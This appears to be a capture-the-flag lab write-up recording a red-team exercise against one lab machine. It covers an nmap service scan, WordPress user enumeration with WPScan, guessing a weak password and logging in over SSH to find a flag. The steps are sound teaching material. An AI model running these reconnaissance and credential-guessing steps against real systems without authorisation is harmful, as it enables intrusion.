# Read Team: Summary of Operations

-------------------------------------------------------------------------------

### Table of Contents
- Exposed Services
- Critical Vulnerabilities
- Exploitation

### Exposed Services
Nmap scan results for each machine reveal the below services and OS details:

Command: `$ nmap -sV 192.168.1.110`

Output Screenshot:

![Nmap scan results](/images/nmap-scan-results.png "Nmap scan results")

This scan identifies the services below as potential points of entry:

**Target 1**
1. Port 22/TCP 	    Open 	SSH
2. Port 80/TCP 	    Open 	HTTP
3. Port 111/TCP 	Open 	rcpbind
4. Port 139/TCP 	Open 	netbios-ssn
5. Port 445/TCP 	Open 	netbios-ssn

### Critical Vulnerabilities
The following vulnerabilities were identified on each target:

**Target 1**
1. User Enumeration (WordPress site)
2. Weak User Password
3. Unsalted User Password Hash (WordPress database)
4. Misconfiguration of User Privileges/Privilege Escalation

### Explotation
The Red Team was able to penetrate Target 1 and retrieve the following confidential data:

**Target 1**
- **Flag1: b9bbcb33ellb80be759c4e844862482d**
- Exploit Used:
    - WPScan to enumerate users of the Target 1 WordPress site
    - Command: 
        - `$ wpscan --url http://192.168.1.110 --enumerate u`

![WPScan results](/images/nmap-scan-results.png "WPScan results")

- Targeting user Michael
    - Small manual Brute Force attack to guess/finds Michael’s password
    - User password was weak and obvious
    - Password: michael
- Capturing Flag 1: SSH in as Michael traversing through directories and files.
    - Flag 1 found in var/www/html folder at root in service.html in a HTML comment below the footer.
    - Commands:
        - `ssh michael@192.168.1.110`
        - `pw: michael`
        - `cd ../`
        - `cd ../`
        - `cd var/www/html`
        - `ls -l`
        - `nano service.html`